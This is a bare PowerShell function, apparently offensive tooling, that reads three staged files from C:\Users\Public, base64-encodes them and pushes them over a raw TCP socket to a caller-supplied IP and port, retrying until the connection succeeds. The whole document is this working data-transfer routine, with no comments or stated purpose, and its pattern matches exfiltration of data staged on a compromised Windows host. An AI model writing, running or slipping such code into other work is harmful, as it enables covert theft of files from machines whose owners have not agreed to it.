function Invoke-Transmission {
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]
        $ip,

        [Parameter(Position = 1)]
        [ValidateNotNullOrEmpty()]
        [int]
        $port = 9000
    )
    $g = New-Object byte[] 1
    $Message1 = [text.Encoding]::Ascii.GetBytes([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\Users\Public\1')))
    $Message2 = [text.Encoding]::Ascii.GetBytes([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\Users\Public\2')))
    $Message3 = [text.Encoding]::Ascii.GetBytes([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\Users\Public\3')))
    $length1 = [text.Encoding]::Ascii.GetBytes($Message1.Length)
    $length2 = [text.Encoding]::Ascii.GetBytes($Message2.Length)
    $length3 = [text.Encoding]::Ascii.GetBytes($Message3.Length)
    do{
        try   { $client = New-Object System.Net.Sockets.TcpClient $ip, $port } 
        catch { Sleep 1;Write-Host Connecting... }
    } while (-not $client.Connected)
    $stream = $client.GetStream()
    sleep 1
    $stream.Write($length1,0,$length1.Length)
    $stream.read($g, 0, $g.Length)
    $stream.Write($length2,0,$length2.Length)
    $stream.read($g, 0, $g.Length)
    $stream.Write($length3,0,$length3.Length)
    $stream.read($g, 0, $g.Length)
    $stream.Write($Message1,0,$Message1.Length)
    $stream.read($g, 0, $g.Length)
    $stream.Write($Message2,0,$Message2.Length)
    $stream.read($g, 0, $g.Length)
    $stream.Write($Message3,0,$Message3.Length)
    $client.Close()
    $client.Dispose()
    Write-Host Finished
}